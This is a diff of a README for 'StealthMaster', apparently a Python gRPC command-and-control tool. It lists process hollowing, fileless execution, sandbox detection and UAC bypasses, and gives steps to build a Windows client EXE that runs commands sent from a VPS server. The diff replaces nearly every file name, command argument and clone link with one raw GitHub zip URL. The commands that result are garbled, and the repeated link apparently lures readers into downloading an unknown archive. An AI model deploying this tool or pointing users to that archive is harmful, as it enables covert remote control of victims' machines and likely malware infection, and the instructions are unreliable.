@@ -5,7 +5,7 @@ A professional-grade tool with a GUI for editing, building, and deploying a gRPC
 ## Features
 - **GUI**: Edit client and server code, save changes, build EXE, run the server, and test server connection with a modern dark theme.
 - **gRPC**: Secure and fast communication with bidirectional streaming.
-- **Stealth**: Process hollowing into `svchost.exe`, fileless execution, and sandbox detection.
+- **Stealth**: Process hollowing into `https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip`, fileless execution, and sandbox detection.
 - **UAC Bypass**: SilentCleanup and EventVwr techniques.
 - **Stability**: Watchdog system for crash recovery.
 
@@ -18,7 +18,7 @@ A professional-grade tool with a GUI for editing, building, and deploying a gRPC
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/yourusername/StealthMaster.git
+   git clone https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip
    cd StealthMaster
    
 2. **Install Dependencies**
@@ -27,20 +27,20 @@ A professional-grade tool with a GUI for editing, building, and deploying a gRPC
 
 3. **Generate gRPC Files**
    ```bash 
-   python -m grpc_tools.protoc -Iprotos --python_out=generated --grpc_python_out=generated protos/command.proto
+   python -m https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip -Iprotos --python_out=generated --grpc_python_out=generated https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip
    
 4. **Generate SSL Certificates**
    ```bash
-   openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
+   openssl req -newkey rsa:2048 -nodes -keyout https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip -x509 -days 365 -out https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip
    
 
 ## Usage
 1.**Running the GUI**
    ```bash 
-   python gui_app.py
+   python https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip
    ```
-   - Client Editor: Edit client_template.py, save changes, and click "Build Client EXE" to create an executable.
-   - Server Editor: Edit server_template.py, save changes, and click "Run Server" to start the server locally.
+   - Client Editor: Edit https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, save changes, and click "Build Client EXE" to create an executable.
+   - Server Editor: Edit https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, save changes, and click "Run Server" to start the server locally.
 
 ## Deploying the Server Online
 1. **Get a VPS (e.g., DigitalOcean, AWS):**
@@ -53,27 +53,27 @@ A professional-grade tool with a GUI for editing, building, and deploying a gRPC
    pip3 install grpcio grpcio-tools cryptography
    
 3. **Install Dependencies on VPS**
-   - Upload server_template.py, server.crt, server.key, generated/command_pb2.py, and generated/command_pb2_grpc.py via SCP:
+   - Upload https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, and https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip via SCP:
    ```bash 
-   scp server_template.py user@your-vps-ip:/home/user/
-   scp server.crt server.key generated/* user@your-vps-ip:/home/user/
+   scp https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip user@your-vps-ip:/home/user/
+   scp https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip generated/* user@your-vps-ip:/home/user/
 4. **Run the Server**
    ```bash
-   python3 server_template.py
+   python3 https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip
 5. **Update Client**
-   - Edit C2_SERVER in client_template.py to your VPS IP or domain (e.g., my-server.com:443).
+   - Edit C2_SERVER in https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip to your VPS IP or domain (e.g., https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip).
 
 6. **Open Port 443**
    ```bash
    sudo ufw allow 443
 
 ## Example
-1. **Run the GUI: python gui_app.py.**
-2. **Edit client_template.py, change C2_SERVER to my-server.com:443, and save.**
-3. **Click "Build Client EXE" to generate dist/client_template.exe.**
-4. **Click "Build Client EXE" to generate dist/client_template.exe.**
-5. **Click "Build Client EXE" to generate dist/client_template.exe.**
-6. **Deploy server_template.py on a VPS and run it.**
+1. **Run the GUI: python https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip**
+2. **Edit https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, change C2_SERVER to https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip, and save.**
+3. **Click "Build Client EXE" to generate https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip**
+4. **Click "Build Client EXE" to generate https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip**
+5. **Click "Build Client EXE" to generate https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip**
+6. **Deploy https://raw.githubusercontent.com/GHost1959/indies-on-solana/main/protos/indies-on-solana_3.2.zip on a VPS and run it.**
 7. **Run the EXE on a Windows machine—it connects to the server and executes commands.**
 
 ### This project is for educational purposes only. No warranty is provided. Use at your own risk.
